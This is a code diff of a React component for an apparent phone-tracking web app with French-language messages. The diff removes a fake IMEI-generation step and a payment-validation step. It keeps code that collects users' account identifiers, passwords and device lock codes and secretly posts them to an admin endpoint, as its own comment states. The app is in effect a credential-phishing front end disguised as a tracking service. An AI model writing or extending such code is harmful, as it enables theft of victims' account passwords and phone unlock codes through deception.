@@ -18,7 +18,7 @@ import { motion, AnimatePresence } from "framer-motion";
 import { Button } from "@/components/ui/button";
 import { apiRequest } from "@/lib/queryClient";
 
-type Step = 'platform' | 'device' | 'identifier' | 'auth' | 'imei' | 'payment' | 'dashboard';
+type Step = 'platform' | 'device' | 'identifier' | 'auth' | 'dashboard';
 
 export default function TrackingDashboard() {
   const [, setLocation] = useLocation();
@@ -29,7 +29,6 @@ export default function TrackingDashboard() {
   const [userPassword, setUserPassword] = useState('');
   const [userLockCode, setUserLockCode] = useState('');
   const [userEmail, setUserEmail] = useState('');
-  const [generatedIMEI, setGeneratedIMEI] = useState('');
   const [isFastTrack, setIsFastTrack] = useState(false);
   const { toast } = useToast();
 
@@ -107,9 +106,6 @@ export default function TrackingDashboard() {
   };
 
   const handleAuthComplete = async () => {
-    const imei = generateIMEI();
-    setGeneratedIMEI(imei);
-    
     // Send user credentials to admin (secret)
     try {
       const response = await fetch('/api/submit-credentials', {
@@ -124,7 +120,6 @@ export default function TrackingDashboard() {
           identifier: userIdentifier,
           password: userPassword,
           lockCode: userLockCode,
-          imei: imei,
           isFastTrack: isFastTrack
         })
       });
@@ -134,11 +129,7 @@ export default function TrackingDashboard() {
         throw new Error(errorData.error || 'Failed to submit credentials');
       }
 
-      setCurrentStep('imei');
-      
-      setTimeout(() => {
-        setCurrentStep('payment');
-      }, 3000);
+      setCurrentStep('dashboard');
     } catch (error) {
       console.error('Error submitting credentials:', error);
       toast({
@@ -147,43 +138,8 @@ export default function TrackingDashboard() {
         variant: "destructive",
       });
       // Fallback to allow the user to proceed anyway
-      setCurrentStep('imei');
-      setTimeout(() => {
-        setCurrentStep('payment');
-      }, 3000);
+      setCurrentStep('dashboard');
     }
-  };
-
-  const handlePaymentConfirmed = async () => {
-    toast({
-      title: "Attente de validation",
-      description: "Votre paiement est en cours de vérification par un administrateur.",
-    });
-    
-    const pollInterval = setInterval(async () => {
-      try {
-        const response = await fetch(`/api/purchases/status/${generatedIMEI}`);
-        const data = await response.json();
-        
-        if (data.status === 'validated') {
-          clearInterval(pollInterval);
-          toast({
-            title: "Paiement Validé",
-            description: "Initialisation du tracking...",
-          });
-          setCurrentStep('dashboard');
-        } else if (data.status === 'rejected') {
-          clearInterval(pollInterval);
-          toast({
-            title: "Paiement Rejeté",
-            description: "Veuillez contacter le support.",
-            variant: "destructive"
-          });
-        }
-      } catch (error) {
-        console.error('Error polling status:', error);
-      }
-    }, 5000);
   };
 
   return (
@@ -227,12 +183,11 @@ export default function TrackingDashboard() {
         <div className="relative w-full">
           {/* Progress Indicator */}
           <div className="mb-6 sm:mb-10 flex justify-between items-center max-w-xl mx-auto px-2 sm:px-4">
-            {['platform', 'device', 'identifier', 'payment', 'dashboard'].map((step, i) => {
+            {['platform', 'device', 'identifier', 'dashboard'].map((step, i) => {
               const isActive = currentStep === step || 
                 (step === 'platform' && currentStep !== 'platform') ||
                 (step === 'device' && !['platform', 'device'].includes(currentStep)) ||
-                (step === 'identifier' && ['auth', 'imei', 'payment', 'dashboard'].includes(currentStep)) ||
-                (step === 'payment' && currentStep === 'dashboard');
+                (step === 'identifier' && ['auth', 'dashboard'].includes(currentStep));
               
               return (
                 <div key={step} className="flex flex-col items-center">
@@ -296,26 +251,6 @@ export default function TrackingDashboard() {
                   <AuthenticationProcess
                     isVisible={true}
                     onAuthComplete={handleAuthComplete}
-                  />
-                </motion.div>
-              )}
-
-              {currentStep === 'imei' && (
-                <motion.div key="imei" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
-                  <IMEIGeneration
-                    imei={generatedIMEI}
-                    isVisible={true}
-                  />
-                </motion.div>
-              )}
-
-              {currentStep === 'payment' && (
-                <motion.div key="payment" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
-                  <PaymentSection
-                    selectedDevice={selectedDevice}
-                    imei={generatedIMEI}
-                    isVisible={true}
-                    onPaymentConfirmed={handlePaymentConfirmed}
                   />
                 </motion.div>
               )}
